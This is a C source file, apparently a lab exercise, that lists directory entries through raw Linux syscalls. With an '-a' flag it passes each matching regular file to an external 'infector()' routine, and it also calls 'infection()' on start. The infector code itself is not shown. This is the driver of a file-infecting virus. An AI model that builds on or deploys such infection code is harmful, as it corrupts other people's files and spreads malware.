
#define sys_open 	5
#define sys_close 	6
#define sys_read	3
#define sys_write	4
#define sys_lseek	19
#define sys_getdents	141

#define STDIN 		0
#define STDOUT 		1
#define STDERR 		2

#define O_RDONLY	0
#define O_RDRW		2

#define SEEK_END	2
#define SEEK_CUR	1
#define SEEK_SET	0

#define DIR_MAX_SIZE	8192
#define DT_REG		8

#include "util.h"

extern void *code_start();
extern void *code_end();
extern void *infection();
extern void *infector(char *file);

int system_call(int num, ...);

/* debug flag */
int debug = 0;

void mylog(char *text, int length) {
  if (debug) system_call(sys_write,STDERR,text, length);
}
void mylogs(char *text) {
  mylog(text, strlen(text));
}

void error(char *text) {
  mylogs("error: ");
  system_call(1, 0x55, 0, 0); /* exit with status 0x55 */
}

int print(char *text, int length) {
  int retval = system_call(sys_write,STDOUT,text, length);
  /*if (debug) {
    mylogs("called system_call 4 (SYS_WRITE) with arguments: ");
    mylogs(text);
    mylogs(" ");
    mylogs(itoa(length));
    mylogs("\n");
    
    mylogs("system_call 4 (SYS_WRITE) returned ");
    mylogs(itoa(retval));
    mylogs("\n");
  }*/
  return retval;
}
int prints(char *text) {
  return print(text, strlen(text));
}

int getdents(int dir, char buff[], int buffer_size) {
  int read = system_call(sys_getdents, dir, buff, buffer_size);
  
  if (debug) {
    mylogs("called system_call 141 (sys_getdents) with arguments: ");
    mylogs(itoa(dir));
    mylogs(" ");
    mylogs(itoa((int)buff));
    mylogs(" ");
    mylogs(itoa(buffer_size));
    mylogs("\n");
    
    mylogs("system_call 141 (sys_getdents) returned ");
    mylogs(itoa(read));
    mylogs("\n");
  }
  if (read == -1) error("getdents returned -1\n");
  return read;
}

int open_dir() {
  int dir = system_call(sys_open, ".", O_RDONLY);
  if (debug) {
    mylogs("called system_call 5 (SYS_OPEN) with arguments: . 0 (O_RDONLY)\n");
    mylogs("system_call 5 (SYS_OPEN) returned\n");
    mylogs(itoa(dir));
    mylogs("\n");
  }
  if (dir == -1) error("open directory\n");
  return dir;
}

struct linux_dirent {
unsigned long  d_ino;     /* Inode number */
unsigned long  d_off;     /* Offset to next linux_dirent */
unsigned short d_reclen;  /* Length of this linux_dirent */
char           d_name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
};

int main(int argc, char *argv[]) {
  
  int i; char last_char_in_name;
  int directory;
  char buff[DIR_MAX_SIZE];
  int read, offset; char d_type;
  struct linux_dirent *d;
  /* flags */
  char s = 0, a = 0;
  
  prints("flame on!\n");
  prints("code_start: ");
  prints(itoa((int)*code_start));
  prints("\n");
  prints("code_end: ");
  prints(itoa((int)*code_end));
  prints("\n");
  prints("infection: ");
  prints(itoa((int)*infection));
  prints("\n");
  prints("infector: ");
  prints(itoa((int)*infector));
  prints("\n");
  
  prints("testing infection...\n");
  infection();
  
  /* scan arguments */
  for (i = 1; i < argc; i++) {
    if (0 == strcmp(argv[i], "-d")) {
      debug = 1;
      mylogs("debug mode on\n");
    } else if (0 == strcmp(argv[i], "-s")) {
      s = *argv[i+1];
      mylogs("-s argument detected: ");
      mylog(&s, 1);
      mylogs("\n");
    } else if (0 == strcmp(argv[i], "-a")) {
      a = *argv[i+1];
      mylogs("-a argument detected: ");
      mylog(&a, 1);
      mylogs("\n");
    }
  }
  
  directory = open_dir();
  
  read = getdents(directory, buff, DIR_MAX_SIZE);
  
  if (read == 0) {
    mylogs("directory is empty\n");
    return 0;
  }
  
  prints(" --------------------------------------------------\n");
  if (debug) { 
    prints("total: ");
    prints(itoa(read));
    prints("\n");
    prints("s: ");
    print(&s, 1);
    prints("\ta: ");
    print(&a, 1);
    prints("\n");
  }
  if (a) {
    prints("infection mode.\n");
  }
  for (offset = 0; offset < read;) {
    d = (struct linux_dirent *) (buff + offset);
    
    d_type = *(buff + offset + d->d_reclen - 1);
    
    last_char_in_name = d->d_name[strlen(d->d_name) - 1];
    
    if (debug) {
      prints("last char in name: ");
      print(&last_char_in_name, 1);
      prints("\t type: ");
      prints(itoa(d_type));
      prints("\n");
    }
    if ((!s && !a) || (d_type == DT_REG && ((s && s == last_char_in_name) || (a && a == last_char_in_name)))) {
      prints(d->d_name);
      prints("\n");
      if (a) {
	prints("infecting...\n");
	infector(d->d_name);
      }
    }
    offset += d -> d_reclen;
  }
  prints("finished.\n");
  return 0;
}